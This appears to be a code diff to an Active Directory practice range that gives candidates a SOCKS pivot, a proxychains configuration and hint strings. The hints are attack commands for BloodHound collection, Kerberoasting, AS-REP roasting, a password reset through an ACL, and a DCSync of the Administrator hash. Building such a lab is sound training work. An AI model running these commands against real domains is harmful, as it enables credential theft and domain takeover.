@@ -121,34 +121,56 @@ def foothold() -> dict:
             "password": os.environ.get("ADRANGE_FOOTHOLD_PASSWORD", "")}
 
 
+def socks() -> dict:
+    """The SOCKS5 pivot the candidate tunnels through. Railway exposes one TCP proxy per service, so
+    a SOCKS pivot gives access to every AD port at its standard number. ADRANGE_HOST/ADRANGE_SOCKS_PORT
+    are the public proxy endpoint; the creds gate the proxy (shown to the candidate, not secret)."""
+    return {"host": os.environ.get("ADRANGE_HOST", ""),
+            "port": int(os.environ.get("ADRANGE_SOCKS_PORT", "0") or 0),
+            "username": os.environ.get("ADRANGE_SOCKS_USER", "ranger"),
+            "password": os.environ.get("ADRANGE_SOCKS_PASSWORD", "")}
+
+
 def expected_admin_nt_hash() -> str | None:
     pw = os.environ.get("ADRANGE_ADMIN_PASSWORD")
     return nt_hash(pw) if pw else None
 
 
+# The DC is reached at its own loopback THROUGH the SOCKS pivot (microsocks runs in the DC container).
+_TARGET = "127.0.0.1"
+
+
 def connection_details(candidate=None) -> dict:
     """Everything a candidate needs to attack the range. Never includes the admin password or proof
-    material - only the foothold they are legitimately given."""
-    host = os.environ.get("ADRANGE_HOST", "")
-    ports = _ports()
+    material - only the foothold they are legitimately given and the SOCKS pivot they tunnel through."""
+    sk = socks()
     fh = foothold()
+    r = realm()
+    proxychains_conf = ("[ProxyList]\nsocks5 %s %s %s %s"
+                        % (sk["host"], sk["port"], sk["username"], sk["password"]))
     return {
         "enabled": enabled(),
-        "host": host,
-        "realm": realm(),
+        "realm": r,
         "domain": netbios(),
-        "ports": ports,
+        "socks": sk,
+        "proxychains_conf": proxychains_conf,
+        "target": _TARGET,
         "foothold": fh,
-        "objective": ("Compromise the domain via the planted path and DCSync the Administrator "
-                      "account; submit the Administrator NT hash as proof."),
+        "objective": ("Pivot in through the SOCKS proxy, compromise the domain via the planted path, "
+                      "DCSync the Administrator account, and submit its NT hash as proof."),
         "hints": [
-            "Collect the graph: bloodhound-python -d %s -u %s -p '<pw>' -ns %s -c all"
-            % (realm(), fh["username"], host),
-            "Kerberoast: GetUserSPNs.py %s/%s:'<pw>' -dc-ip %s -request"
-            % (realm(), fh["username"], host),
-            "AS-REP roast: GetNPUsers.py %s/ -usersfile users.txt -dc-ip %s" % (realm(), host),
-            "DCSync (over SMB): secretsdump.py %s/<pwned>:'<pw>'@%s -just-dc-user Administrator"
-            % (realm(), host),
+            "Add the SOCKS pivot to /etc/proxychains4.conf:  socks5 %s %s %s %s"
+            % (sk["host"], sk["port"], sk["username"], sk["password"]),
+            "Collect the graph:  proxychains bloodhound-python -d %s -u %s -p '<pw>' -ns %s "
+            "--dns-tcp -c all" % (r, fh["username"], _TARGET),
+            "Kerberoast:  proxychains GetUserSPNs.py %s/%s:'<pw>' -dc-ip %s -request"
+            % (r, fh["username"], _TARGET),
+            "AS-REP roast:  proxychains GetNPUsers.py %s/ -usersfile users.txt -dc-ip %s"
+            % (r, _TARGET),
+            "Abuse the ACL:  proxychains bloodyAD -u %s -p '<pw>' -d %s --host %s set password "
+            "svc_mssql '<newpw>'" % (fh["username"], r, _TARGET),
+            "DCSync:  proxychains secretsdump.py %s/svc_mssql:'<newpw>'@%s -just-dc-user Administrator"
+            % (r, _TARGET),
         ],
     }
 
